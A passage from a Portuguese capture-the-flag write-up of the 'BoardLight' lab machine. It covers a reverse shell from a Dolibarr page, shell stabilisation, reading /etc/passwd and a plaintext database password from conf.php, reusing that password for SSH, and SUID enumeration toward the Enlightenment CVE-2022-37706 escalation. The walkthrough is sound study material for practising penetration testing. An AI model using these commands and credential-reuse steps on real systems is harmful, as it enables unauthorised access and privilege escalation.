  <p>Com o listener adequado na porta <code>443</code> na attackbox, acessar a página vulnerável no Dolibarr resulta em execução do comando e abre um shell interativo como o usuário sob o qual o serviço web está rodando, estabelecendo o foothold inicial na box.</p>
  <p>Na prática, depois de atualizar o payload para o reverse shell em Bash e salvar a página, o navegador fica travado aguardando resposta, enquanto a conexão chega no listener:</p>
  <pre><code>nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.231.37 34692
bash: cannot set terminal process group (861): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/website$</code></pre>
  <p>O shell vem como usuário <code>www-data</code>, já dentro do diretório do módulo de websites do Dolibarr, confirmando o comprometimento inicial da aplicação.</p>
  <p>Para melhorar a usabilidade desse shell interativo (histórico, atalhos e comportamento de terminal mais próximo de um SSH normal), apliquei a técnica padrão de estabilização usando <code>script</code>, <code>stty</code> e <code>reset</code>:</p>
  <pre><code>www-data@boardlight:~/html/crm.board.htb/htdocs/website$ script /dev/null -c bash
Script started, file is /dev/null

www-data@boardlight:~/html/crm.board.htb/htdocs/website$ ^Z
[1]+  Stopped                 nc -lnvp 443

stty raw -echo; fg
nc -lnvp 443
reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@boardlight:~/html/crm.board.htb/htdocs/website$</code></pre>
  <p>Depois dessa sequência, o shell fica muito mais confortável de usar para enumeração e exploração dentro da máquina comprometida.</p>

  <h2>Shell as larissa</h2>
  <p>Com o shell inicial como <code>www-data</code>, o próximo passo foi identificar usuários reais do sistema com diretório em <code>/home</code> e shell interativo configurado. A listagem de <code>/home</code> mostra apenas um usuário comum:</p>
  <pre><code>www-data@boardlight:/home$ ls
larissa</code></pre>
  <p>Consultando o <code>/etc/passwd</code> filtrando apenas entradas que terminam em <code>sh</code>, fica claro que apenas <code>root</code> e <code>larissa</code> possuem shell válido:</p>
  <pre><code>www-data@boardlight:/home$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash</code></pre>
  <p>O usuário <code>www-data</code> não tem permissão para acessar o diretório pessoal de <code>/home/larissa</code>, o que indica a necessidade de encontrar credenciais ou algum reuso de senha para pivotar o acesso até essa conta antes de pensar em escalar para <code>root</code>.</p>

  <h2>Dolibarr – conf.php e credenciais do banco</h2>
  <p>A partir do shell como <code>www-data</code>, uma fonte óbvia de informação sensível é o próprio arquivo de configuração do Dolibarr. Ele fica em <code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code>:</p>
  <pre><code>www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls
conf.php  conf.php.example  conf.php.old</code></pre>
  <p>O <code>conf.php</code> contém diversas definições de caminho, parâmetros gerais da aplicação e, principalmente, os detalhes de conexão com o banco de dados MySQL:</p>
  <pre><code>&lt;?php
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';</code></pre>
  <p>A parte mais interessante aqui é a senha de banco <code>serverfun2$2023!!</code>, usada pelo usuário <code>dolibarrowner</code>. Além de permitir acesso direto ao banco da aplicação, essa credencial acaba sendo reutilizada em outros contextos na máquina, o que viabiliza o pivot das próximas etapas.</p>
  <p>Testando reutilização de credenciais, utilizei essa mesma senha para autenticar via SSH diretamente como <code>larissa</code> em <code>board.htb</code>. O acesso funcionou de primeira:</p>
  <pre><code>$IP="10.129.231.37"; $Domain="board.htb"; $UserSSH="larissa"; $PassSSH='serverfun2$2023!!'; sshpass -p $PassSSH ssh -o StrictHostKeyChecking=no "$UserSSH@$Domain"

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$</code></pre>
  <p>Com isso, o shell restrito via web é substituído por um acesso SSH completo como <code>larissa</code>, preparando o terreno para o escalonamento local até <code>root</code>.</p>

  <h2>User flag</h2>
  <p>Já logado como <code>larissa</code>, o diretório home da usuária apresenta a estrutura típica de uma estação com ambiente gráfico instalado, com pastas como Desktop, Downloads e Pictures:</p>
  <pre><code>larissa@boardlight:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt</code></pre>
  <p>Esse padrão foge um pouco do que se espera em instalações puramente de servidor, que costumam ter um <code>$HOME</code> mais minimalista. Aqui isso antecipa que há um desktop GUI configurado, o que será relevante mais à frente no contexto do exploit de Enlightenment.</p>
  <p>A primeira flag está no arquivo <code>user.txt</code>:</p>
  <pre><code>larissa@boardlight:~$ cat user.txt
cbcdd575************************</code></pre>

  <h2>Escalonamento – CVE‑2022‑37706</h2>
  <p>Já com acesso SSH completo como <code>larissa</code>, o foco passa a ser o escalonamento local até <code>root</code>. O primeiro passo foi checar rapidamente se havia privilégios óbvios via <code>sudo</code>:</p>
  <pre><code>larissa@boardlight:~$ sudo -l
[sudo] password for larissa:
Sorry, user larissa may not run sudo on localhost.</code></pre>
  <p>Sem caminhos fáceis via <code>sudo</code>, o próximo passo foi olhar processos e como o <code>/proc</code> está montado. O comando <code>ps auxww</code> mostra apenas processos da própria <code>larissa</code>, o que aponta para um <code>/proc</code> endurecido com <code>hidepid</code>:</p>
  <pre><code>larissa@boardlight:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
larissa     3129  0.0  0.1  10776  4980 pts/0    S    06:45   0:00 -bash
larissa     3558  0.0  0.0  11496  3388 pts/0    R+   08:18   0:00 ps auxww
larissa@boardlight:~$ mount | grep "^proc"
proc on /proc type proc (rw,relatime,hidepid=invisible)</code></pre>
  <p>Com o <code>/proc</code> montado com <code>hidepid=invisible</code>, não é possível enxergar processos de outros usuários, reduzindo a superfície de enumeração via listas de processos. A alternativa natural é procurar binários SUID interessantes:</p>
  <pre><code>larissa@boardlight:~$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/su
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/vmware-user-suid-wrapper</code></pre>
  <p>Os quatro binários ligados ao Enlightenment (<code>enlightenment_sys</code>, <code>enlightenment_ckpasswd</code>, <code>enlightenment_backlight</code> e <code>freqset</code>) se destacam imediatamente. Enlightenment é um gerenciador de janelas para o X Window System (uma interface gráfica completa para Linux), o que combina com o fato de o diretório <co